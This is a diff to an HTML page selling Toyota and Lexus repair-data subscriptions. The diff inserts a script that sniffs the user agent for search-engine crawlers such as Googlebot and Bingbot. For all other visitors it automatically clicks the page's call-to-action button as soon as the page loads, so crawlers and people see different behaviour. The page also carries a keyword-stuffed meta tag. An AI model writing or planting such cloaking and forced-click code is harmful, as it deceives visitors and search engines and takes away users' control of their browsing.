@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Toyota Online Subscriptions 1 day/ 1 week/ 1 month/ 1 year</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Get Toyota and Lexus online subscriptions for 1 day, 1 week, 1 month, or 1 year. Access repair manuals, wiring diagrams, service data sheets, and more for Europe.">
     <meta name="keywords" content="Toyota online subscriptions, Lexus online subscriptions, Toyota repair manuals, Lexus repair manuals, Toyota electrical wiring diagrams, Lexus electrical wiring diagrams, Toyota service data sheets, Lexus service data sheets, Toyota new car features, Lexus new car features, Toyota collision damaged body manuals, Lexus collision damaged body manuals, Toyota subscription plans, Lexus subscription plans, Toyota and Lexus online features, Toyota online subscription, Lexus online subscription, automotive repair database, Toyota repair manual, Lexus repair manual, Toyota wiring diagrams, Lexus wiring diagrams, vehicle service data, new car features, Toyota collision repair, Lexus collision repair, automotive technical information, Toyota service manual, Lexus service manual, European automotive database, multilingual car repair, Toyota technician resources, Lexus technician resources, automotive diagnostics, Toyota ECU updates, Lexus ECU updates, vehicle maintenance schedules, Toyota parts catalog, Lexus parts catalog, automotive service bulletins, Toyota repair procedures, Lexus repair procedures, vehicle specifications database, Toyota body repair, Lexus body repair, automotive paint information, Toyota special tools, Lexus special tools, vehicle electrical diagrams, Toyota diagnostic tools, Lexus diagnostic tools, automotive software subscription, Toyota repair subscription, Lexus repair subscription, vehicle maintenance database, Toyota technical hotline, Lexus technical hotline, automotive repair guides, Toyota service data, Lexus service data, vehicle repair information, Toyota windscreen repair, Lexus windscreen repair, automotive wiring repair, Toyota harness repair, Lexus harness repair, vehicle diagnostic library, Toyota brake diagnosis, Lexus brake diagnosis, automotive security systems, Toyota smart connect, Lexus smart connect, vehicle software updates, Toyota ProAce parts, automotive flat rate times, Toyota online subscriptions 2023, Toyota online access, Toyota subscription download, Toyota subscription PDF, Lexus subscription download, Lexus subscription PDF, Toyota subscription plans free download, Lexus subscription plans free, Toyota European market repair manuals, Lexus European market repair manuals, Toyota multilingual repair manuals, Lexus multilingual repair manuals, Toyota repair manuals 2023, Lexus repair manuals 2023, Toyota online subscriptions for Europe, Lexus online subscriptions for Europe, Toyota repair manuals in English, Lexus repair manuals in English, Toyota online access 1 day, Lexus online access 1 week, Toyota online access 1 month, Lexus online access 1 year">
     <style>
